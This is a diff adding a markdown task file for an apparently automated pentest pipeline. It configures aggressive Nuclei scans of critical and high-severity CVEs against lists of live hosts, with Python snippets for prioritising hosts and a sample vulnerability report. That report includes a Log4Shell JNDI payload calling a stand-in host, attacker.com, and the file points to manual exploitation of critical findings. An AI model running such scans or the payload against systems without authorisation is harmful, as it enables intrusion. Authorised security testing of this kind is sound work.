@@ -1,0 +1,304 @@
+# ==============================================================================
+# TASK 38: NUCLEI CVEs - CRITICAL & HIGH PRIORITY
+# ==============================================================================
+# TOOL: Nuclei
+# MODE: AGGRESSIVE - No limits (own target)
+# TEMPLATES: cves/ (critical + high severity)
+# ==============================================================================
+
+## OBJECTIVE
+
+Scan for known CVEs with Critical and High severity ratings.
+These are exploitable vulnerabilities that pose immediate risk.
+
+## PREREQUISITES
+
+✅ Nuclei installed: `nuclei -version`
+✅ Templates updated: `nuclei -update-templates`
+✅ Task 35 completed (tech fingerprinting - CRITICAL for CVE matching)
+✅ Task 36-37 completed (context gathering)
+✅ Input: live URLs + tech stack knowledge
+
+## AGGRESSIVE MODE SETTINGS
+
+```bash
+# AGGRESSIVE - Your own target, no limits
+# Phase 1: Critical CVEs
+nuclei -l targets.txt \
+    -t cves/ -severity critical \
+    -c 100 -rl 0 -timeout 10 -retries 3 \
+    -bulk-size 100 -stats -json -nc \
+    -o outputs/nuclei/cves_critical_results.json
+
+# Phase 2: High CVEs
+nuclei -l targets.txt \
+    -t cves/ -severity high \
+    -c 100 -rl 0 -timeout 10 -retries 3 \
+    -bulk-size 100 -stats -json -nc \
+    -o outputs/nuclei/cves_high_results.json
+```
+
+## CVE TEMPLATE STATISTICS
+
+```
+Total CVE Templates: ~3000+
+
+By Year:
+- 2024: ~200+ (newest, actively exploited)
+- 2023: ~400+ 
+- 2022: ~500+
+- 2021: ~400+
+- 2020: ~300+
+- Pre-2020: ~1200+
+
+By Severity:
+- Critical: ~300-400 templates
+- High: ~1000-1200 templates
+```
+
+## 🧠 DYNAMIC BRAIN INTELLIGENCE - AI CVE TARGETING
+
+### Learns CVE↔Technology Correlations (Not Hardcoded)
+```python
+# Brain learns from ACTUAL findings, not static mappings
+
+class IntelligentTechKnowledge:
+    """
+    Dynamic CVE intelligence - learns which CVEs affect which technologies
+    from real scan results, not hardcoded lists.
+    """
+    
+    def add_finding(self, finding):
+        # When CVE-2021-44228 hits a host with 'spring' tag:
+        if 'cve' in template_id.lower():
+            cve_id = extract_cve(template_id)  # CVE-2021-44228
+            
+            # Learn correlation with ALL technologies on this host
+            for tech in host_data['technologies']:
+                self.cve_to_tech[cve_id].add(tech)  # CVE → tech
+                self.tech_to_cves[tech].add(cve_id)  # tech → CVE
+        
+        # Now brain knows: spring → CVE-2021-44228
+        # Next scan: prioritize spring hosts for CVE templates
+```
+
+### AI-Powered Host Prioritization
+```python
+def _calculate_host_priority(self, host, scan_type):
+    """Score hosts based on LEARNED vulnerability patterns."""
+    score = 1.0
+    
+    # Hosts with versions = CVE-matchable
+    score += len(host_data['versions']) * 1.5
+    
+    # Hosts where we've already found vulns
+    score += severity_counts.get('critical', 0) * 5.0
+    score += severity_counts.get('high', 0) * 3.0
+    
+    # LEARNED CORRELATIONS (not hardcoded)
+    for tech in host_data['technologies']:
+        if tech in self.tech_to_cves:
+            # More known CVEs for this tech = higher priority
+            score += len(self.tech_to_cves[tech]) * 0.5
+    
+    return score
+```
+
+### Version-Based CVE Matching
+```python
+# Brain dynamically extracts versions from ANY text:
+def _extract_versions(self, text):
+    patterns = [
+        r'([\w.-]+)/([\d]+\.[\d]+\.?[\d]*)',  # nginx/1.19.0
+        r'"version":\s*"([\d.]+)"',            # JSON
+    ]
+    # Extracts WITHOUT knowing what products exist
+```
+
+### Continuous Learning Loop
+```
+Scan 1: Find WordPress 6.4.1 on host A
+        → Brain learns: "wordpress" → host A, version 6.4.1
+
+Scan 2: CVE-2024-1234 (WordPress) hits host A
+        → Brain learns: wordpress → CVE-2024-1234
+
+Scan 3: New host B with WordPress detected
+        → Brain suggests: Check CVE-2024-1234 on host B
+```
+
+## 9-MINUTE BATCH APPROACH
+
+```
+[Batch Strategy for CVEs]
+┌─────────────────────────────────────────────────────┐
+│ Phase 1: Critical CVEs on ALL hosts                │
+│ BATCH_SIZE = 500                                   │
+├─────────────────────────────────────────────────────┤
+│ Batch 1: URLs 1-500, critical severity             │
+│ Batch 2: URLs 501-1000, critical severity          │
+│ ... checkpoint after each batch                    │
+├─────────────────────────────────────────────────────┤
+│ Phase 2: High CVEs on ALL hosts                    │
+├─────────────────────────────────────────────────────┤
+│ Batch N: URLs 1-500, high severity                 │
+│ Batch N+1: URLs 501-1000, high severity            │
+│ ... checkpoint after each batch                    │
+└─────────────────────────────────────────────────────┘
+
+# Tech-targeted optional phase:
+# If Spring detected → additional Spring CVE sweep
+# If WordPress detected → additional WP CVE sweep
+```
+
+## CVE FINDING HANDLING
+
+### Critical CVE Response
+```python
+def handle_cve_finding(finding):
+    """Handle CVE findings based on severity."""
+    
+    cve_id = extract_cve_id(finding['template-id'])
+    severity = finding['info']['severity'].upper()
+    host = finding['host']
+    
+    if severity == 'CRITICAL':
+        # 1. Immediate alert
+        print(f"🚨 CRITICAL CVE FOUND: {cve_id} on {host}")
+        
+        # 2. Detailed vulnerability report
+        write_vuln_report(
+            finding,
+            priority='P0',
+            escalate=True
+        )
+        
+        # 3. Add to critical findings file
+        with open('outputs/nuclei/critical_cves.txt', 'a') as f:
+            f.write(f'{host}\t{cve_id}\t{severity}\n')
+    
+    elif severity == 'HIGH':
+        # Vulnerability report, no immediate escalation
+        write_vuln_report(finding, priority='P1')
+```
+
+## EXECUTION
+
+### Using Python Script
+```bash
+cd d:\wallet\Mylab
+
+# Critical CVEs first
+python task/task35/nuclei_scanner.py \
+    --scan-type cves-critical \
+    --targets outputs/live_base_urls.txt \
+    --output outputs \
+    --temp temp/task38
+
+# Then High CVEs
+python task/task35/nuclei_scanner.py \
+    --scan-type cves-high \
+    --targets outputs/live_base_urls.txt \
+    --output outputs \
+    --temp temp/task38
+```
+
+### Using Nuclei Directly
+```bash
+# Critical CVEs
+nuclei -l outputs/live_base_urls.txt \
+    -t cves/ -severity critical \
+    -c 100 -rl 0 -timeout 10 -retries 3 \
+    -json -stats -nc \
+    -o outputs/nuclei/cves_critical.json
+
+# High CVEs
+nuclei -l outputs/live_base_urls.txt \
+    -t cves/ -severity high \
+    -c 100 -rl 0 -timeout 10 -retries 3 \
+    -json -stats -nc \
+    -o outputs/nuclei/cves_high.json
+```
+
+### Tech-Targeted CVE Scan
+```bash
+# If WordPress detected in tech fingerprinting
+nuclei -l outputs/nuclei/tech_wordpress_hosts.txt \
+    -t cves/ -tags wordpress \
+    -severity critical,high \
+    -c 100 -rl 0 \
+    -json -o outputs/nuclei/wp_cves.json
+
+# If Java/Spring detected
+nuclei -l outputs/nuclei/tech_java_hosts.txt \
+    -t cves/ -tags java,spring,struts,log4j \
+    -severity critical,high \
+    -c 100 -rl 0 \
+    -json -o outputs/nuclei/java_cves.json
+```
+
+## OUTPUT FILES
+
+| File | Description |
+|------|-------------|
+| `outputs/nuclei/cves_critical_results.json` | Critical CVE findings |
+| `outputs/nuclei/cves_high_results.json` | High CVE findings |
+| `outputs/nuclei/critical_cves.txt` | Host + CVE quick reference |
+| `outputs/vulnerabilities/NUCLEI-CRIT-*.md` | Critical vuln reports |
+| `outputs/vulnerabilities/NUCLEI-HIGH-*.md` | High vuln reports |
+| `temp/task38/checkpoint.json` | Resume checkpoint |
+
+## VULNERABILITY REPORT FORMAT
+
+```markdown
+# Vulnerability Report: NUCLEI-0099
+
+## Overview
+| Field | Value |
+|-------|-------|
+| **CVE** | CVE-2021-44228 |
+| **Name** | Apache Log4j Remote Code Execution |
+| **Severity** | CRITICAL |
+| **CVSS** | 10.0 |
+| **Host** | https://target.com:8080 |
+| **Matched At** | /api/v1/search |
+
+## Description
+Apache Log4j2 <=2.14.1 JNDI features do not protect against 
+attacker controlled LDAP and other JNDI related endpoints.
+
+## Proof of Concept
+```
+${jndi:ldap://attacker.com/a}
+```
+
+## Impact
+Remote code execution with privileges of the running application.
+
+## Remediation
+1. Upgrade Log4j to version 2.17.1+
+2. Set log4j2.formatMsgNoLookups=true
+3. Remove JndiLookup class from classpath
+```
+
+## CHAIN TO NEXT TASK
+
+```
+Task 38 (Critical+High CVEs) → Task 39 (Medium+Low CVEs)
+
+# Any critical CVE found:
+# → Immediate documentation
+# → Add to critical findings
+# → Consider for manual exploitation
+
+# Update tech_stack.json:
+# hosts[x]['cves_found'] = ['CVE-2021-44228', ...]
+```
+
+## SUCCESS CRITERIA
+
+- [ ] All hosts tested for ~1500 Critical+High CVE templates
+- [ ] Tech-aware targeting (Java hosts get Log4j/Spring checks)
+- [ ] Critical CVEs → P0 reports with full details
+- [ ] High CVEs → P1 reports
+- [ ] All findings in outputs/nuclei/ and vulnerabilities/
